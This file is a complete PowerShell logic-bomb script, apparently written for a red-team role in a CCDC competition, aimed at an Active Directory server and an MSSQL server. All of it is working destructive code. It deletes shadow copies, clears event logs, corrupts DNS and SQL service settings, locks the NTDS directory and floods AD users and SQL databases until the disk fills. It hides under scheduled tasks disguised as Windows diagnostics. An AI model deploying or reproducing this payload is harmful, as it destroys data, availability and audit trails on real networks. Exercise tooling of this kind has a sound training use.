#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- Logic Bomb (Time-Triggered Destruction)
# Targets: 172.20.240.100 (AD) and 172.20.240.120 (MSSQL)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# Plants a scheduled task that fires at 2026-11-21 12:00:00 CST (noon match day).
# Auto-detects AD vs MSSQL and runs the appropriate payload, then self-destructs.
#
# AD PAYLOAD:
#   1. Corrupt DNS ImagePath -> points to nonexistent binary
#   2. Lock NTDS directory ACL (Everyone:DENY FullControl, inherited)
#   3. Poison default domain password policy (MaxPwdAge=0, MinPwdLen=20)
#   4. Delete all VSS shadow copies (vssadmin + wmic fallback)
#   5. Clear Security + System + Application event logs
#
# MSSQL PAYLOAD:
#   1. ALTER DATABASE master SET SINGLE_USER WITH ROLLBACK IMMEDIATE
#   2. Stop SQL Server + set StartupType=Disabled
#   3. Corrupt SQL startup param: add invalid -e path
#   4. Null out SQL TcpPort (service won't bind any port even if started)
#   5. Delete all VSS shadow copies
#   6. Clear Security + System + Application event logs
#
# Usage (run on each box separately):
#   .\05_logicbomb.ps1 deploy     # arms bomb -> detonates 2026-11-21 12:00 CST
#   .\05_logicbomb.ps1 cleanup    # disarm (remove task)
#   .\05_logicbomb.ps1 detonate   # fire payload immediately
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param(
    [Parameter(Position=0)][string]$Mode = "deploy"
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

$StateDir   = "C:\Windows\System32\spool\drivers\color"
$StateFile  = "$StateDir\.rt21-bomb.json"
$TaskName   = "SystemDiagnosticsCollector"
$TaskPath   = "\Microsoft\Windows\Diagnosis\"
$DropDir    = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
$FloodTaskName = "WindowsIdentitySync"
$FloodTaskPath = "\Microsoft\Windows\WindowsUpdate\"

# Detect which box we're on
$IsAD     = (Get-Service "NTDS"    -ErrorAction SilentlyContinue) -ne $null
$IsMSSQL  = (Get-Service "MSSQLSERVER" -ErrorAction SilentlyContinue) -ne $null
$BoxType  = if ($IsAD) { "AD" } elseif ($IsMSSQL) { "MSSQL" } else { "UNKNOWN" }

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   Nov 21 2026 -- Logic Bomb / Time-Triggered Payload"   -ForegroundColor Yellow
Write-Host "   Box type detected: $BoxType"                           -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

# =============================================================================
# PAYLOAD FUNCTIONS
# =============================================================================

function Invoke-ADPayload {
    Write-Section "PAYLOAD / AD Box Destruction"

    # 1. Corrupt DNS service ImagePath
    Write-Info "Corrupting DNS service ImagePath..."
    try {
        $dnsSvc = "HKLM:\SYSTEM\CurrentControlSet\Services\DNS"
        $origImg = (Get-ItemProperty $dnsSvc -Name ImagePath -ErrorAction Stop).ImagePath
        Set-ItemProperty $dnsSvc -Name ImagePath -Value "C:\Windows\System32\NonExistent_dns.exe" -Force
        Write-Success "DNS ImagePath corrupted"
    } catch {
        Write-Warn "DNS ImagePath: $_"
    }

    # 2. Lock NTDS directory ACL
    Write-Info "Locking NTDS directory..."
    $ntdsDir = "C:\Windows\NTDS"
    if (Test-Path $ntdsDir) {
        try {
            $acl  = Get-Acl $ntdsDir
            $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
                "Everyone",
                [System.Security.AccessControl.FileSystemRights]::FullControl,
                [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Deny
            )
            $acl.AddAccessRule($deny)
            Set-Acl -Path $ntdsDir -AclObject $acl -ErrorAction Stop
            Write-Success "NTDS dir ACL locked (Everyone:FullControl DENY)"
        } catch {
            Write-Warn "NTDS ACL: $_"
        }
    }

    # 3. Poison domain password policy
    Write-Info "Poisoning domain password policy..."
    try {
        & net.exe accounts /maxpwage:0 /minpwlen:20 2>&1 | Out-Null
        Write-Success "Password policy: MaxPwdAge=0 MinPwdLen=20 (immediate expiry, long min length)"
    } catch {
        Write-Warn "Password policy: $_"
    }

    # 4. Delete shadow copies
    Write-Info "Deleting VSS shadow copies..."
    try {
        & vssadmin.exe delete shadows /all /quiet 2>&1 | Out-Null
        & wmic.exe shadowcopy delete 2>&1 | Out-Null
        Write-Success "Shadow copies deleted"
    } catch {
        Write-Warn "Shadow copies: $_"
    }

    # 5. Clear event logs
    Write-Info "Clearing event logs..."
    foreach ($log in @("Security","System","Application","Directory Service","DNS Server")) {
        try {
            & wevtutil.exe cl $log 2>&1 | Out-Null
        } catch {}
    }
    Write-Success "Event logs cleared"

    # 6. User flood -- ADSI loop writing users into CN=Users for 4.5 min,
    #    repeated every 5 min via scheduled task. Each run creates as many
    #    AD users as ADSI can commit in the window (~100-500/sec on a DC).
    #    After a few cycles NTDS.dit balloons and the domain falls over.
    Write-Info "Planting user flood task..."
    New-Item -Path $DropDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $floodScript = @'
try {
    $de  = [ADSI]("LDAP://CN=Users," + ([ADSI]"LDAP://RootDSE").defaultNamingContext[0])
    $end = (Get-Date).AddSeconds(270)
    while ((Get-Date) -lt $end) {
        $n = "u" + [guid]::NewGuid().ToString("N").Substring(0,10)
        try {
            $u = $de.Children.Add("CN=$n", "user")
            $u.Put("sAMAccountName", $n)
            $u.CommitChanges()
        } catch {}
    }
} catch {}
'@
    $floodPath = "$DropDir\rtflood_ad.ps1"
    Set-Content $floodPath -Value $floodScript -Encoding UTF8 -Force
    try { (Get-Item $floodPath -Force).Attributes = "Hidden,System" } catch {}

    try {
        Unregister-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath `
            -Confirm:$false -ErrorAction SilentlyContinue

        $action    = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -File `"$floodPath`""
        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        $trigger.Repetition.Interval = "PT5M"
        $trigger.Repetition.Duration = "P1Y"
        $settings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([timespan]::FromMinutes(5)) `
            -MultipleInstances Parallel -Hidden
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest `
            -LogonType ServiceAccount

        Register-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath `
            -Action $action -Trigger $trigger -Settings $settings -Principal $principal `
            -Description "Synchronizes Windows identity federation metadata" `
            -Force -ErrorAction Stop | Out-Null

        Write-Success "User flood task registered: $FloodTaskPath$FloodTaskName (every 5 min)"
    } catch {
        Write-Warn "User flood task registration failed: $_"
    }
}

function Invoke-MSSQLPayload {
    Write-Section "PAYLOAD / MSSQL Box Destruction"

    # 1. ALTER DATABASE master SINGLE_USER
    Write-Info "Setting master DB to SINGLE_USER..."
    try {
        & sqlcmd.exe -S "(local)" -E -Q "ALTER DATABASE master SET SINGLE_USER WITH ROLLBACK IMMEDIATE;" 2>&1 | Out-Null
        Write-Success "master DB set to SINGLE_USER"
    } catch {
        Write-Warn "SINGLE_USER alter: $_"
    }

    # 2. Stop SQL Server + disable startup
    Write-Info "Stopping + disabling SQL Server..."
    try {
        Set-Service MSSQLSERVER -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service MSSQLSERVER -Force -ErrorAction SilentlyContinue
        Write-Success "MSSQLSERVER stopped and disabled"
    } catch {
        Write-Warn "MSSQLSERVER stop: $_"
    }

    # 3. Corrupt SQL startup parameters
    Write-Info "Corrupting SQL startup params..."
    $sqlInstKey = $null
    try {
        $sqlInstKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
            Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
            Select-Object -First 1 -ExpandProperty PSChildName
    } catch {}

    if ($sqlInstKey) {
        $paramPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer\Parameters"
        try {
            $existing = (Get-ItemProperty $paramPath -ErrorAction SilentlyContinue).PSObject.Properties |
                Where-Object { $_.Name -like "SQLArg*" } | Measure-Object | Select-Object -ExpandProperty Count
            $nextIdx = $existing
            New-ItemProperty $paramPath -Name "SQLArg$nextIdx" -Value "-eC:\NonExistent\ERRORLOG_rt" -Force | Out-Null
            Write-Success "Invalid startup param injected"
        } catch {
            Write-Warn "Startup param: $_"
        }

        # 4. Null out TCP port
        $tcpPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer\SuperSocketNetLib\Tcp\IPAll"
        if (Test-Path $tcpPath) {
            try {
                Set-ItemProperty $tcpPath -Name TcpPort -Value "" -Force
                Set-ItemProperty $tcpPath -Name TcpDynamicPorts -Value "" -Force
                Write-Success "SQL TCP port nulled out"
            } catch {
                Write-Warn "TCP port null: $_"
            }
        }
    }

    # 5. Delete shadow copies
    Write-Info "Deleting VSS shadow copies..."
    try {
        & vssadmin.exe delete shadows /all /quiet 2>&1 | Out-Null
        & wmic.exe shadowcopy delete 2>&1 | Out-Null
        Write-Success "Shadow copies deleted"
    } catch {
        Write-Warn "Shadow copies: $_"
    }

    # 6. Clear event logs
    Write-Info "Clearing event logs..."
    foreach ($log in @("Security","System","Application","Windows PowerShell")) {
        try {
            & wevtutil.exe cl $log 2>&1 | Out-Null
        } catch {}
    }
    Write-Success "Event logs cleared"

    # 7. SQL database proliferation + tempdb hammer
    #
    #    Two-pronged attack, both run via the same recurring scheduled task:
    #
    #    A) Database proliferation (Linux analogy: dd to fill the data partition):
    #       Creates new SQL databases in a tight loop for 4.5 min.  Each database
    #       SQL Server must allocate disk space for, add to sys.databases, and spin
    #       up checkpoint/log-writer threads for.  Disk fills -> SQL can't write
    #       transactions on ANY database, service halts.  Much more impactful than
    #       login flood because it consumes real disk, not just catalog rows.
    #
    #    B) Tempdb hammer (Linux analogy: filling /tmp):
    #       Blasts queries that force huge tempdb spills.  Tempdb is SQL's shared
    #       scratch space for sorts, hashes, temp tables, spools.  Fill it and every
    #       concurrent query on the instance starts failing with "could not allocate
    #       space in tempdb" -- immediate cross-database effect.
    #
    #    Runs every 5 min via scheduled task until disk is gone or service stops.
    Write-Info "Planting SQL database flood + tempdb hammer task..."
    New-Item -Path $DropDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    $floodSqlPath = "$DropDir\rtflood_sql.sql"
    $floodSql = @'
-- Phase A: database proliferation -- fills disk, stresses SQL resource manager
DECLARE @end  DATETIME = DATEADD(SECOND, 240, GETDATE())
DECLARE @n    NVARCHAR(100)
DECLARE @sql  NVARCHAR(500)
DECLARE @data NVARCHAR(260)

SELECT @data = physical_name
FROM   sys.master_files
WHERE  database_id = 1 AND type = 0

SET @data = LEFT(@data, LEN(@data) - CHARINDEX('\', REVERSE(@data)))

WHILE GETDATE() < @end BEGIN
    SET @n   = N'rtdb_' + LOWER(REPLACE(CONVERT(NVARCHAR(36), NEWID()), '-', ''))
    SET @sql = N'CREATE DATABASE [' + @n + N'] ON PRIMARY '
             + N'(NAME=''' + @n + N''', FILENAME=''' + @data + N'\' + @n + N'.mdf'', '
             + N'SIZE=64MB, FILEGROWTH=0) '
             + N'LOG ON (NAME=''' + @n + N'_log'', FILENAME=''' + @data + N'\' + @n + N'_log.ldf'', '
             + N'SIZE=8MB, FILEGROWTH=0)'
    BEGIN TRY EXEC(@sql) END TRY BEGIN CATCH END CATCH
END

-- Phase B: tempdb hammer -- Linux analogy: filling /tmp
-- Forces a massive cross-join sort spill into tempdb; runs twice back-to-back.
DECLARE @i INT = 0
WHILE @i < 2 BEGIN
    BEGIN TRY
        SELECT TOP 1 a.object_id
        FROM   sys.all_columns a
        CROSS JOIN sys.all_columns b
        CROSS JOIN sys.all_columns c
        ORDER BY NEWID()
    END TRY BEGIN CATCH END CATCH
    SET @i = @i + 1
END
'@
    Set-Content $floodSqlPath -Value $floodSql -Encoding UTF8 -Force
    try { (Get-Item $floodSqlPath -Force).Attributes = "Hidden,System" } catch {}

    try {
        Unregister-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath `
            -Confirm:$false -ErrorAction SilentlyContinue

        $action    = New-ScheduledTaskAction -Execute "sqlcmd.exe" `
            -Argument "-S (local) -E -i `"$floodSqlPath`" -t 300"
        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        $trigger.Repetition.Interval = "PT5M"
        $trigger.Repetition.Duration = "P1Y"
        $settings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([timespan]::FromMinutes(5)) `
            -MultipleInstances Parallel -Hidden
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest `
            -LogonType ServiceAccount

        Register-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath `
            -Action $action -Trigger $trigger -Settings $settings -Principal $principal `
            -Description "Synchronizes Windows identity federation metadata" `
            -Force -ErrorAction Stop | Out-Null

        Write-Success "SQL database flood + tempdb hammer task registered: $FloodTaskPath$FloodTaskName (every 5 min)"
        Write-Info "   Phase A: 64MB databases created until disk full (~$([math]::Round(40*1024/64)) databases to fill 40GB)"
        Write-Info "   Phase B: tempdb hammer via cross-join sort spill"
    } catch {
        Write-Warn "SQL flood task registration failed: $_"
    }
}

# =============================================================================
# MODES
# =============================================================================

switch ($Mode.ToLower()) {

"detonate" {
    Write-Info "Immediate detonation triggered"
    if ($IsAD)    { Invoke-ADPayload    }
    elseif ($IsMSSQL) { Invoke-MSSQLPayload }
    else { Write-Err "Could not detect box type -- run with -BoxType override or on the correct target" }
}

"deploy" {
    New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    # Hardcoded detonation: 2026-11-21 12:00:00 CST (noon match day)
    $detonateTime = [datetime]::new(2026, 11, 21, 12, 0, 0)

    Write-Info "Detonation scheduled: $($detonateTime.ToString('yyyy-MM-dd HH:mm:ss')) (CST)"

    # Stash a copy of this script to $DropDir so it survives the toolkit self-wipe.
    $thisScript = "$DropDir\rtbomb.ps1"
    try {
        $src = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
        if ($src -and (Test-Path $src)) {
            Copy-Item $src $thisScript -Force -ErrorAction Stop
            try { (Get-Item $thisScript -Force).Attributes = "Hidden,System" } catch {}
            Write-Success "Payload stashed: $thisScript"
        } else {
            Write-Warn "Could not locate script path -- bomb task may fail if toolkit is wiped"
        }
    } catch { Write-Warn "Stash failed: $_" }

    # Register scheduled task
    try {
        # Remove any existing task with same name
        Unregister-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Confirm:$false `
            -ErrorAction SilentlyContinue

        $action  = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -File `"$thisScript`" detonate"
        $trigger = New-ScheduledTaskTrigger -Once -At $detonateTime
        $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([timespan]::FromMinutes(10)) `
            -MultipleInstances IgnoreNew -Hidden
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest `
            -LogonType ServiceAccount

        Register-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath `
            -Action $action -Trigger $trigger -Settings $settings -Principal $principal `
            -Description "Collects system diagnostics for health monitoring baseline" `
            -Force -ErrorAction Stop | Out-Null

        Write-Success "Logic bomb task registered: $TaskPath$TaskName"
        Write-Success "Detonation at: $($detonateTime.ToString('HH:mm:ss')) ($([math]::Round(($detonateTime - (Get-Date)).TotalMinutes)) min from now)"
    } catch {
        Write-Err "Task registration failed: $_"
    }

    # Save state
    @{
        deployed_at    = (Get-Date -Format "o")
        detonate_at    = $detonateTime.ToString("o")
        task_name      = $TaskName
        task_path      = $TaskPath
        box_type       = $BoxType
        script_path    = $thisScript
    } | ConvertTo-Json | Set-Content -Path $StateFile -Encoding UTF8
    Write-Success "State: $StateFile"

    Write-Host ""
    Write-Host " -- Logic Bomb Armed ----------------------------------" -ForegroundColor DarkRed
    Write-Host "   Target type : $BoxType" -ForegroundColor Gray
    Write-Host "   Task        : $TaskPath$TaskName" -ForegroundColor Gray
    Write-Host "   Detonates   : $($detonateTime.ToString('HH:mm:ss'))" -ForegroundColor Red
    Write-Host " -------------------------------------------------------" -ForegroundColor DarkRed
}

"cleanup" {
    Write-Section "Disarming Logic Bomb"
    try {
        Unregister-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Confirm:$false `
            -ErrorAction Stop
        Write-Success "Task removed: $TaskPath$TaskName"
    } catch {
        Write-Warn "Task removal failed (may already be gone): $_"
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    }

    Write-Section "Disarming User Flood Task"
    try {
        Unregister-ScheduledTask -TaskName $FloodTaskName -TaskPath $FloodTaskPath `
            -Confirm:$false -ErrorAction Stop
        Write-Success "Flood task removed: $FloodTaskPath$FloodTaskName"
    } catch {
        Write-Warn "Flood task removal failed (may already be gone): $_"
        Unregister-ScheduledTask -TaskName $FloodTaskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    Remove-Item "$DropDir\rtflood_ad.ps1"  -Force -ErrorAction SilentlyContinue
    Remove-Item "$DropDir\rtflood_sql.sql" -Force -ErrorAction SilentlyContinue
    Remove-Item "$DropDir\rtbomb.ps1"      -Force -ErrorAction SilentlyContinue
    # Note: rtdb_* databases created by the flood are NOT auto-removed.
    # Manual cleanup on MSSQL box: SELECT name FROM sys.databases WHERE name LIKE 'rtdb_%'
    # then DROP DATABASE each one, or: EXEC sp_MSforeachdb 'IF ''?'' LIKE ''rtdb_%'' DROP DATABASE [?]'

    Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
    Write-Success "Logic bomb disarmed"
}

default {
    Write-Err "Usage: .\05_logicbomb.ps1 [deploy|cleanup|detonate]"
    exit 1
}

}
